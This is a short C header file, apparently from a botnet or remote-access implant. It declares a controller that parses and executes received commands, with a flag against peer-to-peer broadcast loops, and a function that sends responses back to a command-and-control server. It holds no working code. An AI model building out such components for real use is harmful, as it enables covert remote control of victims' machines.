#ifndef CONTROLLER_H
#define CONTROLLER_H

#include "../structures.h"

// Parses and executes a command. The from_p2p flag prevents broadcast loops.
void controller_handle_command(char *command, int from_p2p);

// Sends a response back to the C2 server
void controller_send_response(char *response);

#endif // CONTROLLER_H
